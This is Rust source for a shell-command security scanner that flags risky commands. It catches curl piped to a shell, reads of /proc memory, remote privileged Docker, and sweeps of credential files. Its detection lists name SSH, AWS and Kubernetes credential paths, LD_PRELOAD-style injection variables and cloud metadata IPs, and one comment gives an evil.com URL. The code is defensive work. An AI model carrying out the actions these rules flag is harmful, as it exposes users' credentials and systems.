
fn unwrap_env_split_string_segment(
    seg: &tokenize::Segment,
    shell: ShellType,
) -> Option<tokenize::Segment> {
    let command = seg.command.as_ref()?;
    if normalize_cmd_base(command, shell) != "env" {
        return None;
    }

    let value_short_flags = ["-u", "-C"];
    let value_long_flags = [
        "--unset",
        "--chdir",
        "--block-signal",
        "--default-signal",
        "--ignore-signal",
    ];

    let args = &seg.args;
    let mut idx = 0;
    while idx < args.len() {
        let normalized = normalize_shell_token(args[idx].trim(), shell);
        if normalized == "--split-string" || normalized == "-S" {
            let command = args.get(idx + 1)?;
            let normalized_command = normalize_shell_token(command.trim(), shell);
            return tokenize::tokenize(&normalized_command, shell)
                .into_iter()
                .next();
        }
        if let Some(val) = normalized.strip_prefix("--split-string=") {
            let normalized_command = normalize_shell_token(val.trim(), shell);
            return tokenize::tokenize(&normalized_command, shell)
                .into_iter()
                .next();
        }
        if normalized == "--" {
            return None;
        }
        if normalized.starts_with("--") {
            if value_long_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized.starts_with('-') {
            if value_short_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized.contains('=') {
            idx += 1;
            continue;
        }
        return None;
    }
    None
}

/// Resolve base command through command/exec/nohup wrappers.
fn resolve_base_wrapper(
    args: &[String],
    wrapper: &str,
    shell: ShellType,
    depth: usize,
) -> Option<String> {
    if depth == 0 {
        return None;
    }
    let value_flags: &[&str] = match wrapper {
        "exec" => &["-a"],
        _ => &[],
    };
    let mut idx = 0;
    while idx < args.len() {
        let normalized = normalize_shell_token(args[idx].trim(), shell);
        if normalized == "--" {
            // `command/exec/nohup -- cmd …`: the token after `--` is the command
            // to run; resolve its own wrapper chain rather than returning it
            // verbatim (round-21 F1).
            return resolve_base_from_positional(&args[idx + 1..], shell, depth);
        }
        if normalized.starts_with("--") || normalized.starts_with('-') {
            if value_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        // First positional is the command — recurse so nested sudo/env/etc still resolves.
        return resolve_base_from_positional(&args[idx..], shell, depth);
    }
    None
}

#[derive(Clone, Copy)]
enum ResolverParser {
    Generic,
    Sudo,
    Env,
    Command,
    Exec,
    Nohup,
}

enum ResolveStep<'a> {
    Found(String),
    Next {
        parser: ResolverParser,
        args: &'a [String],
        inspected: usize,
    },
    Stop,
}

/// Resolve interpreter from a generic arg list. Uses an iterative parser with a
/// token-inspection budget so deeply nested wrappers cannot bypass detection.
fn resolve_from_args(args: &[String], shell: ShellType) -> Option<String> {
    resolve_with_parser(args, shell, ResolverParser::Generic)
}

fn resolve_sudo_args(args: &[String], shell: ShellType) -> Option<String> {
    resolve_with_parser(args, shell, ResolverParser::Sudo)
}

fn resolve_env_args(args: &[String], shell: ShellType) -> Option<String> {
    resolve_with_parser(args, shell, ResolverParser::Env)
}

fn resolve_wrapper_args(args: &[String], wrapper: &str, shell: ShellType) -> Option<String> {
    let parser = match wrapper {
        "command" => ResolverParser::Command,
        "exec" => ResolverParser::Exec,
        "nohup" => ResolverParser::Nohup,
        _ => ResolverParser::Command,
    };
    resolve_with_parser(args, shell, parser)
}

fn resolve_with_parser(
    args: &[String],
    shell: ShellType,
    start_parser: ResolverParser,
) -> Option<String> {
    if args.is_empty() {
        return None;
    }

    let mut parser = start_parser;
    let mut current = args;
    // Budget scales with input size and keeps resolution bounded even on adversarial inputs.
    let mut budget = args.len().saturating_mul(4).saturating_add(8);

    while budget > 0 && !current.is_empty() {
        let step = match parser {
            ResolverParser::Generic => resolve_step_generic(current, shell),
            ResolverParser::Sudo => resolve_step_sudo(current, shell),
            ResolverParser::Env => resolve_step_env(current, shell),
            ResolverParser::Command => resolve_step_wrapper(current, shell, "command"),
            ResolverParser::Exec => resolve_step_wrapper(current, shell, "exec"),
            ResolverParser::Nohup => resolve_step_wrapper(current, shell, "nohup"),
        };

        match step {
            ResolveStep::Found(interpreter) => return Some(interpreter),
            ResolveStep::Stop => return None,
            ResolveStep::Next {
                parser: next_parser,
                args: next_args,
                inspected,
            } => {
                parser = next_parser;
                current = next_args;
                budget = budget.saturating_sub(inspected.max(1));
            }
        }
    }
    None
}

fn resolve_step_generic<'a>(args: &'a [String], shell: ShellType) -> ResolveStep<'a> {
    let mut idx = 0;
    let mut seen_dashdash = false;
    while idx < args.len() {
        let raw = args[idx].trim();
        let normalized = normalize_shell_token(raw, shell);

        if normalized == "--" {
            seen_dashdash = true;
            idx += 1;
            continue;
        }

        // Before `--`: flags and VAR=VALUE assignments are skipped. After `--`, everything is a positional.
        if !seen_dashdash
            && (normalized.starts_with("--")
                || normalized.starts_with('-')
                || normalized.contains('='))
        {
            idx += 1;
            continue;
        }

        let base = basename_from_normalized(&normalized, shell);
        return match base.as_str() {
            "sudo" => ResolveStep::Next {
                parser: ResolverParser::Sudo,
                args: &args[idx + 1..],
                inspected: idx + 1,
            },
            "env" => ResolveStep::Next {
                parser: ResolverParser::Env,
                args: &args[idx + 1..],
                inspected: idx + 1,
            },
            "command" => ResolveStep::Next {
                parser: ResolverParser::Command,
                args: &args[idx + 1..],
                inspected: idx + 1,
            },
            "exec" => ResolveStep::Next {
                parser: ResolverParser::Exec,
                args: &args[idx + 1..],
                inspected: idx + 1,
            },
            "nohup" => ResolveStep::Next {
                parser: ResolverParser::Nohup,
                args: &args[idx + 1..],
                inspected: idx + 1,
            },
            _ if is_interpreter(&base) => ResolveStep::Found(base),
            _ => ResolveStep::Stop,
        };
    }
    ResolveStep::Stop
}

fn resolve_step_sudo<'a>(args: &'a [String], shell: ShellType) -> ResolveStep<'a> {
    let value_short_flags = ["-u", "-g", "-C", "-D", "-R", "-T"];
    let value_long_flags = [
        "--user",
        "--group",
        "--close-from",
        "--chdir",
        "--role",
        "--type",
        "--other-user",
        "--host",
        "--timeout",
    ];

    let mut idx = 0;
    while idx < args.len() {
        let raw = args[idx].trim();
        let normalized = normalize_shell_token(raw, shell);
        // -- ends option parsing; remaining args are the command
        if normalized == "--" {
            return ResolveStep::Next {
                parser: ResolverParser::Generic,
                args: &args[(idx + 1).min(args.len())..],
                inspected: idx + 1,
            };
        }
        if normalized.starts_with("--") {
            if value_long_flags.iter().any(|f| normalized == *f) {
                idx += 2;
                continue;
            }
            if let Some((key, _)) = normalized.split_once('=') {
                if value_long_flags.contains(&key) {
                    idx += 1;
                    continue;
                }
            }
            // Unknown long flag: treat as boolean.
            idx += 1;
            continue;
        }
        if normalized.starts_with('-') {
            if value_short_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else if normalized.len() > 2
                && value_short_flags
                    .iter()
                    .any(|f| normalized.ends_with(&f[1..]))
            {
                // Combined short flags (e.g. `-iu`): last letter may still consume the next arg.
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        return ResolveStep::Next {
            parser: ResolverParser::Generic,
            args: &args[idx..],
            inspected: idx + 1,
        };
    }
    ResolveStep::Stop
}

fn resolve_step_env<'a>(args: &'a [String], shell: ShellType) -> ResolveStep<'a> {
    let value_short_flags = ["-u", "-C"];
    let value_long_flags = [
        "--unset",
        "--chdir",
        "--split-string",
        "--block-signal",
        "--default-signal",
        "--ignore-signal",
    ];

    let mut idx = 0;
    while idx < args.len() {
        let raw = args[idx].trim();
        let normalized = normalize_shell_token(raw, shell);
        // -- ends option parsing; remaining args are the command
        if normalized == "--" {
            return ResolveStep::Next {
                parser: ResolverParser::Generic,
                args: &args[(idx + 1).min(args.len())..],
                inspected: idx + 1,
            };
        }
        if normalized.starts_with("--") {
            // --split-string: value is a command string.
            if normalized == "--split-string" {
                if idx + 1 < args.len() {
                    let base = normalize_cmd_base(&args[idx + 1], shell);
                    if is_interpreter(&base) {
                        return ResolveStep::Found(base);
                    }
                }
                idx += 2;
                continue;
            }
            if let Some(val) = normalized.strip_prefix("--split-string=") {
                let base = normalize_cmd_base(val, shell);
                if is_interpreter(&base) {
                    return ResolveStep::Found(base);
                }
                idx += 1;
                continue;
            }
            if value_long_flags.iter().any(|f| normalized == *f) {
                idx += 2;
                continue;
            }
            if let Some((key, _)) = normalized.split_once('=') {
                if value_long_flags.contains(&key) {
                    idx += 1;
                    continue;
                }
            }
            // Unknown long flag: treat as boolean.
            idx += 1;
            continue;
        }
        if normalized == "-S" {
            // -S: value is a command string.
            if idx + 1 < args.len() {
                let base = normalize_cmd_base(&args[idx + 1], shell);
                if is_interpreter(&base) {
                    return ResolveStep::Found(base);
                }
            }
            idx += 2;
            continue;
        }
        if normalized.starts_with('-') {
            if value_short_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized.contains('=') {
            idx += 1;
            continue;
        }
        return ResolveStep::Next {
            parser: ResolverParser::Generic,
            args: &args[idx..],
            inspected: idx + 1,
        };
    }
    ResolveStep::Stop
}

fn resolve_step_wrapper<'a>(
    args: &'a [String],
    shell: ShellType,
    wrapper: &str,
) -> ResolveStep<'a> {
    let value_flags: &[&str] = match wrapper {
        "exec" => &["-a"],
        _ => &[],
    };

    let mut idx = 0;
    while idx < args.len() {
        let raw = args[idx].trim();
        let normalized = normalize_shell_token(raw, shell);
        // -- ends option parsing; remaining args are the command
        if normalized == "--" {
            return ResolveStep::Next {
                parser: ResolverParser::Generic,
                args: &args[(idx + 1).min(args.len())..],
                inspected: idx + 1,
            };
        }
        if normalized.starts_with("--") || normalized.starts_with('-') {
            if value_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        return ResolveStep::Next {
            parser: ResolverParser::Generic,
            args: &args[idx..],
            inspected: idx + 1,
        };
    }
    ResolveStep::Stop
}

fn check_pipe_to_interpreter(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for (i, seg) in segments.iter().enumerate() {
        if i == 0 {
            continue;
        }
        if let Some(sep) = &seg.preceding_separator {
            if sep == "|" || sep == "|&" {
                if let Some(interpreter) = resolve_interpreter_name(seg, shell) {
                    let source = &segments[i - 1];
                    let source_cmd_ref = source.command.as_deref().unwrap_or("unknown");
                    let source_base = normalize_cmd_base(source_cmd_ref, shell);
                    let source_is_tirith_run = source_base == "tirith"
                        && source
                            .args
                            .first()
                            .map(|arg| normalize_cmd_base(arg, shell) == "run")
                            .unwrap_or(false);
                    let source_label = if source_is_tirith_run {
                        "tirith run".to_string()
                    } else {
                        source_base.clone()
                    };

                    // Skip if the source is tirith itself — its output is trusted.
                    if source_base == "tirith" && !source_is_tirith_run {
                        continue;
                    }

                    let rule_id = match source_base.as_str() {
                        "curl" => RuleId::CurlPipeShell,
                        "wget" => RuleId::WgetPipeShell,
                        "http" | "https" => RuleId::HttpiePipeShell,
                        "xh" => RuleId::XhPipeShell,
                        _ => RuleId::PipeToInterpreter,
                    };

                    let display_cmd = seg.command.as_deref().unwrap_or(&interpreter);

                    let base_desc = format!(
                        "Command pipes output from '{source_label}' directly to \
                         interpreter '{interpreter}'. Downloaded content will be \
                         executed without inspection."
                    );

                    let description = if is_url_fetch_command(&source_base) {
                        let show_tirith_run = cfg!(unix)
                            && supports_tirith_run_hint(&source_base)
                            && shell != ShellType::PowerShell;
                        if let Some(url) = extract_urls_from_args(&source.args, shell)
                            .into_iter()
                            .next()
                            .map(|u| sanitize_url_for_display(&u))
                        {
                            if show_tirith_run {
                                format!(
                                    "{base_desc}\n  Safer: tirith run {url}  \
                                     \u{2014} or: vet {url}  (https://getvet.sh)"
                                )
                            } else {
                                format!(
                                    "{base_desc}\n  Safer: vet {url}  \
                                     (https://getvet.sh)"
                                )
                            }
                        } else if show_tirith_run {
                            format!(
                                "{base_desc}\n  Safer: use 'tirith run <url>' \
                                 or 'vet <url>' (https://getvet.sh) to inspect \
                                 before executing."
                            )
                        } else {
                            format!(
                                "{base_desc}\n  Safer: use 'vet <url>' \
                                 (https://getvet.sh) to inspect before executing."
                            )
                        }
                    } else {
                        base_desc
                    };

                    let mut evidence = vec![Evidence::CommandPattern {
                        pattern: "pipe to interpreter".to_string(),
                        matched: redact::redact_shell_assignments(&format!(
                            "{} | {}",
                            source.raw, seg.raw
                        )),
                    }];
                    for url in extract_urls_from_args(&source.args, shell) {
                        evidence.push(Evidence::Url { raw: url });
                    }

                    findings.push(Finding {
                        rule_id,
                        severity: Severity::High,
                        title: format!("Pipe to interpreter: {source_cmd_ref} | {display_cmd}"),
                        description,
                        evidence,
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                }
            }
        }
    }
}

fn check_dotfile_overwrite(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        let raw = &segment.raw;
        if (raw.contains("> ~/.")
            || raw.contains("> $HOME/.")
            || raw.contains(">> ~/.")
            || raw.contains(">> $HOME/."))
            && !raw.contains("> /dev/null")
        {
            findings.push(Finding {
                rule_id: RuleId::DotfileOverwrite,
                severity: Severity::High,
                title: "Dotfile overwrite detected".to_string(),
                description: "Command redirects output to a dotfile in the home directory, which could overwrite shell configuration".to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "redirect to dotfile".to_string(),
                    matched: redact::redact_shell_assignments(raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }
}

fn check_archive_extract(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        if let Some(ref cmd) = segment.command {
            let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
            if cmd_base == "tar" || cmd_base == "unzip" || cmd_base == "7z" {
                let raw = &segment.raw;
                let sensitive_targets = [
                    "-C /",
                    "-C ~/",
                    "-C $HOME/",
                    "-d /",
                    "-d ~/",
                    "-d $HOME/",
                    "> ~/.",
                    ">> ~/.",
                ];
                for target in &sensitive_targets {
                    if raw.contains(target) {
                        findings.push(Finding {
                            rule_id: RuleId::ArchiveExtract,
                            severity: Severity::Medium,
                            title: "Archive extraction to sensitive path".to_string(),
                            description: format!(
                                "Archive command '{cmd_base}' extracts to a potentially sensitive location"
                            ),
                            evidence: vec![Evidence::CommandPattern {
                                pattern: "archive extract".to_string(),
                                matched: redact::redact_shell_assignments(raw),
                            }],
                            human_view: None,
                            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
                        });
                        return;
                    }
                }
            }
        }
    }
}

/// Commands that read file contents — scoped to utilities commonly used
/// for proc memory dumping. Excludes echo/printf (not file readers).
const PROC_MEM_READER_CMDS: &[&str] = &[
    "cat", "dd", "strings", "head", "tail", "xxd", "od", "base64", "hexdump", "less", "more", "cp",
    "grep",
];

static PROC_MEM_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"/proc/(?:self|\d+)/mem\b").expect("PROC_MEM_RE"));

fn check_proc_mem_access(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let effective_seg =
            unwrap_env_split_string_segment(seg, shell).unwrap_or_else(|| seg.clone());
        let resolved_cmd = resolve_base_through_wrappers(&effective_seg, shell);
        if !PROC_MEM_READER_CMDS.contains(&resolved_cmd.as_str()) {
            continue;
        }

        for arg in &effective_seg.args {
            let normalized = normalize_shell_token(arg, shell);
            if PROC_MEM_RE.is_match(&normalized) {
                findings.push(Finding {
                    rule_id: RuleId::ProcMemAccess,
                    severity: Severity::High,
                    title: "Process memory access detected".to_string(),
                    description: "Command reads from /proc/*/mem, which can dump process memory \
                                  contents including secrets and credentials"
                        .to_string(),
                    evidence: vec![Evidence::CommandPattern {
                        pattern: "proc memory read".to_string(),
                        matched: redact::redact_shell_assignments(&seg.raw),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
                return;
            }
            // dd-style: if=/proc/self/mem
            if let Some(val) = normalized.strip_prefix("if=") {
                if PROC_MEM_RE.is_match(val) {
                    findings.push(Finding {
                        rule_id: RuleId::ProcMemAccess,
                        severity: Severity::High,
                        title: "Process memory access detected".to_string(),
                        description: "Command reads from /proc/*/mem via dd, which can dump \
                                      process memory contents including secrets and credentials"
                            .to_string(),
                        evidence: vec![Evidence::CommandPattern {
                            pattern: "proc memory read".to_string(),
                            matched: redact::redact_shell_assignments(&seg.raw),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                    return;
                }
            }
        }
    }
}

fn check_docker_remote_privesc(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let effective_seg =
            unwrap_env_split_string_segment(seg, shell).unwrap_or_else(|| seg.clone());
        let resolved_cmd = resolve_base_through_wrappers(&effective_seg, shell);
        if resolved_cmd != "docker" && resolved_cmd != "podman" {
            continue;
        }

        let norm_args: Vec<String> = effective_seg
            .args
            .iter()
            .map(|a| normalize_shell_token(a, shell))
            .collect();

        let has_remote = detect_docker_remote_host(&norm_args, &effective_seg, shell);
        if !has_remote {
            continue;
        }

        let has_priv = norm_args.iter().any(|a| a == "--privileged");
        let has_root_mount = has_docker_root_mount(&norm_args);

        if has_priv || has_root_mount {
            findings.push(Finding {
                rule_id: RuleId::DockerRemotePrivEsc,
                severity: Severity::Critical,
                title: "Docker remote privileged escalation detected".to_string(),
                description: "Command targets a remote Docker daemon with privileged access or \
                              host root mount, enabling full host compromise"
                    .to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "docker remote privesc".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

fn detect_docker_remote_host(
    norm_args: &[String],
    seg: &tokenize::Segment,
    shell: ShellType,
) -> bool {
    for (i, arg) in norm_args.iter().enumerate() {
        let lower = arg.to_lowercase();
        if arg.starts_with("-H=tcp://") || lower.starts_with("--host=tcp://") {
            return true;
        }
        if arg == "-H" || lower == "--host" {
            if let Some(next) = norm_args.get(i + 1) {
                if next.starts_with("tcp://") {
                    return true;
                }
            }
        }
    }
    // Leading env assignment: `DOCKER_HOST=tcp://... docker ...`
    for (name, value) in tokenize::leading_env_assignments(&seg.raw) {
        if name.eq_ignore_ascii_case("DOCKER_HOST") {
            let clean_val = normalize_shell_token(&value, shell);
            if clean_val.starts_with("tcp://") {
                return true;
            }
        }
    }
    // env-wrapper form: `env DOCKER_HOST=tcp://... docker ...`.
    // Skip DOCKER_HOST= values that follow -e/--env — those set *container* env, not the client's remote.
    let args = &seg.args;
    for (i, arg) in args.iter().enumerate() {
        let norm = normalize_shell_token(arg, shell);
        if let Some(val) = norm
            .strip_prefix("DOCKER_HOST=")
            .or_else(|| norm.strip_prefix("docker_host="))
        {
            if i > 0 {
                let prev = normalize_shell_token(&args[i - 1], shell);
                let prev_lower = prev.to_lowercase();
                if prev_lower == "-e" || prev_lower == "--env" {
                    continue;
                }
            }
            let clean_val = normalize_shell_token(val, shell);
            if clean_val.starts_with("tcp://") {
                return true;
            }
        }
    }
    false
}

fn has_docker_root_mount(norm_args: &[String]) -> bool {
    for (i, arg) in norm_args.iter().enumerate() {
        let lower = arg.to_lowercase();
        if lower == "-v" || lower == "--volume" {
            if let Some(val) = norm_args.get(i + 1) {
                if val.starts_with("/:/") {
                    return true;
                }
            }
        }
        if lower.starts_with("-v=/:/") || lower.starts_with("--volume=/:/") {
            return true;
        }
        let mount_val = if lower == "--mount" {
            norm_args.get(i + 1).map(|s| s.as_str())
        } else {
            lower.strip_prefix("--mount=")
        };
        if let Some(mv) = mount_val {
            if mv.contains("src=/,")
                || mv.contains("source=/,")
                || mv.ends_with("src=/")
                || mv.ends_with("source=/")
            {
                return true;
            }
        }
    }
    false
}

const CREDENTIAL_PATHS: &[&str] = &[
    "/.ssh/id_",
    "/.ssh/authorized_keys",
    "/.aws/credentials",
    "/.aws/config",
    "/.docker/config.json",
    "/.kube/config",
    "/.config/gcloud/",
    "/.npmrc",
    "/.pypirc",
    "/.netrc",
    "/.gnupg/",
    "/.config/gh/",
    "/.git-credentials",
];

const READ_ARCHIVE_VERBS: &[&str] = &[
    "cat", "tar", "zip", "gzip", "strings", "head", "tail", "base64", "xxd", "dd", "cp", "find",
    "xargs",
];

fn check_credential_file_sweep(
    segments: &[tokenize::Segment],
    shell: ShellType,
    context: ScanContext,
    findings: &mut Vec<Finding>,
) {
    if context != ScanContext::Exec {
        return;
    }

    for seg in segments {
        let effective_seg =
            unwrap_env_split_string_segment(seg, shell).unwrap_or_else(|| seg.clone());
        let resolved_cmd = resolve_base_through_wrappers(&effective_seg, shell);
        if !READ_ARCHIVE_VERBS.contains(&resolved_cmd.as_str()) {
            continue;
        }

        let norm_args: Vec<String> = effective_seg
            .args
            .iter()
            .map(|a| normalize_shell_token(a, shell))
            .collect();
        let seg_text = norm_args.join(" ");
        let matched_count = CREDENTIAL_PATHS
            .iter()
            .filter(|p| seg_text.contains(**p))
            .count();

        if matched_count >= 2 {
            findings.push(Finding {
                rule_id: RuleId::CredentialFileSweep,
                severity: Severity::Medium,
                title: "Multiple credential files accessed".to_string(),
                description: format!(
                    "Command accesses {matched_count} known credential file paths in a single \
                     invocation, which may indicate credential harvesting"
                ),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "credential file sweep".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

/// Environment variables that enable arbitrary code injection via dynamic linker.
const CODE_INJECTION_VARS: &[&str] = &[
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "LD_AUDIT",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
];

/// Environment variables that cause arbitrary script execution at shell startup.
const SHELL_INJECTION_VARS: &[&str] = &["BASH_ENV", "ENV", "PROMPT_COMMAND"];

/// Environment variables that hijack interpreter module/library search paths.
const INTERPRETER_HIJACK_VARS: &[&str] = &["PYTHONPATH", "NODE_OPTIONS", "RUBYLIB", "PERL5LIB"];

/// Sensitive credential variable names that should not be exported in commands.
use super::shared::SENSITIVE_KEY_VARS;

fn classify_env_var(name: &str) -> Option<(RuleId, Severity, &'static str, &'static str)> {
    let name_upper = name.to_ascii_uppercase();
    let name = name_upper.as_str();
    if CODE_INJECTION_VARS.contains(&name) {
        Some((
            RuleId::CodeInjectionEnv,
            Severity::Critical,
            "Code injection environment variable",
            "can inject shared libraries into all processes, enabling arbitrary code execution",
        ))
    } else if SHELL_INJECTION_VARS.contains(&name) {
        Some((
            RuleId::ShellInjectionEnv,
            Severity::Critical,
            "Shell injection environment variable",
            "can cause arbitrary script execution at shell startup",
        ))
    } else if INTERPRETER_HIJACK_VARS.contains(&name) {
        Some((
            RuleId::InterpreterHijackEnv,
            Severity::High,
            "Interpreter hijack environment variable",
            "can hijack the interpreter's module/library search path",
        ))
    } else if SENSITIVE_KEY_VARS.contains(&name) {
        Some((
            RuleId::SensitiveEnvExport,
            Severity::High,
            "Sensitive credential exported",
            "exposes a sensitive credential that may be logged in shell history",
        ))
    } else {
        None
    }
}

/// Cargo global flags that consume the next token as a value.
const CARGO_VALUE_FLAGS: &[&str] = &[
    "-Z",
    "-C",
    "--config",
    "--manifest-path",
    "--color",
    "--target-dir",
    "--target",
];

/// Find the cargo subcommand (first positional arg), skipping flags and toolchain specs.
/// Returns true if the subcommand is `install` or `add`.
fn is_cargo_install_or_add(args: &[String]) -> bool {
    let mut skip_next = false;
    for arg in args {
        if skip_next {
            skip_next = false;
            continue;
        }
        // `cargo +nightly install foo` — the `+toolchain` is not a flag.
        if arg.starts_with('+') {
            continue;
        }
        if arg.starts_with("--") && arg.contains('=') {
            continue;
        }
        if CARGO_VALUE_FLAGS.contains(&arg.as_str()) {
            skip_next = true;
            continue;
        }
        if arg.starts_with('-') {
            continue;
        }
        return arg == "install" || arg == "add";
    }
    false
}

/// Warn when `cargo install/add` is used and no supply-chain audit directory exists.
fn check_vet_not_configured(
    segments: &[tokenize::Segment],
    cwd: Option<&str>,
    findings: &mut Vec<Finding>,
) {
    let is_cargo_install = segments.iter().any(|s| {
        if let Some(ref cmd) = s.command {
            let base = cmd
                .rsplit(['/', '\\'])
                .next()
                .unwrap_or(cmd)
                .to_ascii_lowercase();
            let base = base.strip_suffix(".exe").unwrap_or(&base);
            if base == "cargo" {
                return is_cargo_install_or_add(&s.args);
            }
        }
        false
    });
    if !is_cargo_install {
        return;
    }

    // Require an explicit cwd — without one we cannot reliably resolve supply-chain/config.toml.
    let cwd = match cwd {
        Some(dir) => dir,
        None => return,
    };
    let check_path = std::path::PathBuf::from(cwd).join("supply-chain/config.toml");
    if check_path.exists() {
        return;
    }

    findings.push(Finding {
        rule_id: RuleId::VetNotConfigured,
        severity: Severity::Low,
        title: "No supply-chain audit configured".into(),
        description: "Consider running `cargo vet init` to enable dependency auditing.".into(),
        evidence: vec![],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    });
}

fn check_env_var_in_command(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        let Some(ref cmd) = segment.command else {
            continue;
        };
        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();

        match cmd_base.as_str() {
            "export" => {
                for arg in &segment.args {
                    if let Some((var_name, value)) = arg.split_once('=') {
                        emit_env_finding(var_name.trim(), value, findings);
                    }
                }
            }
            "env" => {
                for arg in &segment.args {
                    let trimmed = arg.trim();
                    if trimmed.starts_with('-') {
                        continue;
                    }
                    if let Some((var_name, value)) = trimmed.split_once('=') {
                        emit_env_finding(var_name.trim(), value, findings);
                    }
                }
            }
            "set" => {
                // Fish shell: set [-gx] VAR_NAME value...
                let mut var_name: Option<&str> = None;
                let mut value_parts: Vec<&str> = Vec::new();
                for arg in &segment.args {
                    let trimmed = arg.trim();
                    if trimmed.starts_with('-') && var_name.is_none() {
                        continue;
                    }
                    if var_name.is_none() {
                        var_name = Some(trimmed);
                    } else {
                        value_parts.push(trimmed);
                    }
                }
                if let Some(name) = var_name {
                    emit_env_finding(name, &value_parts.join(" "), findings);
                }
            }
            _ => {}
        }
    }
}

fn emit_env_finding(var_name: &str, value: &str, findings: &mut Vec<Finding>) {
    let Some((rule_id, severity, title_prefix, desc_suffix)) = classify_env_var(var_name) else {
        return;
    };
    let value_preview = redact_env_value(value);
    findings.push(Finding {
        rule_id,
        severity,
        title: format!("{title_prefix}: {var_name}"),
        description: format!("Setting {var_name} {desc_suffix}"),
        evidence: vec![Evidence::EnvVar {
            name: var_name.to_string(),
            value_preview,
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    });
}

fn redact_env_value(val: &str) -> String {
    if val.is_empty() {
        String::new()
    } else {
        "[REDACTED]".to_string()
    }
}

/// Cloud metadata endpoint IPs that expose instance credentials.
const METADATA_ENDPOINTS: &[&str] = &["169.254.169.254", "100.100.100.200"];

fn check_host_for_network_issues(arg: &str, findings: &mut Vec<Finding>) {
    if let Some(host) = extract_host_from_arg(arg) {
        if METADATA_ENDPOINTS.contains(&host.as_str()) {
            findings.push(Finding {
                rule_id: RuleId::MetadataEndpoint,
                severity: Severity::Critical,
                title: format!("Cloud metadata endpoint access: {host}"),
                description: format!(
                    "Command accesses cloud metadata endpoint {host}, \
                     which can expose instance credentials and sensitive configuration"
                ),
                evidence: vec![Evidence::Url {
                    raw: arg.to_string(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        } else if is_private_ip(&host) {
            findings.push(Finding {
                rule_id: RuleId::PrivateNetworkAccess,
                severity: Severity::High,
                title: format!("Private network access: {host}"),
                description: format!(
                    "Command accesses private network address {host}, \
                     which may indicate SSRF or lateral movement"
                ),
                evidence: vec![Evidence::Url {
                    raw: arg.to_string(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }
}

fn check_network_destination(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        let Some(ref cmd) = segment.command else {
            continue;
        };
        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
        if !is_source_command(&cmd_base) {
            continue;
        }

        for arg in &segment.args {
            let trimmed = arg.trim().trim_matches(|c: char| c == '\'' || c == '"');
            if trimmed.starts_with('-') {
                // `--url=http://evil.com` style — URL is wedged into the flag value.
                if let Some((_flag, value)) = trimmed.split_once('=') {
                    check_host_for_network_issues(value, findings);
                }
                continue;
            }

            check_host_for_network_issues(trimmed, findings);
        }
    }
}

/// Extract a host/IP from a URL-like command argument.
fn extract_host_from_arg(arg: &str) -> Option<String> {
    if let Some(scheme_end) = arg.find("://") {
        let after_scheme = &arg[scheme_end + 3..];
        let after_userinfo = if let Some(at_idx) = after_scheme.find('@') {
            &after_scheme[at_idx + 1..]
        } else {
            after_scheme
        };
        let host_port = after_userinfo.split('/').next().unwrap_or(after_userinfo);
        let host = strip_port(host_port);
        if host.is_empty() || host.contains('/') || host.contains('[') {
            return None;
        }
        return Some(host);
    }

    // Bare host/IP like `curl 169.254.169.254/path`.
    let host_part = arg.split('/').next().unwrap_or(arg);
    let host = strip_port(host_part);

    if host.parse::<std::net::Ipv4Addr>().is_ok() {
        return Some(host);
    }

    if host_part.starts_with('[') {
        if let Some(bracket_end) = host_part.find(']') {
            let ipv6 = &host_part[1..bracket_end];
            if ipv6.parse::<std::net::Ipv6Addr>().is_ok() {
                return Some(ipv6.to_string());
            }
        }
    }

    None
}

/// Strip port number from a host:port string, handling IPv6 brackets.
fn strip_port(host_port: &str) -> String {
    // Bracketed IPv6 with port: [::1]:8080
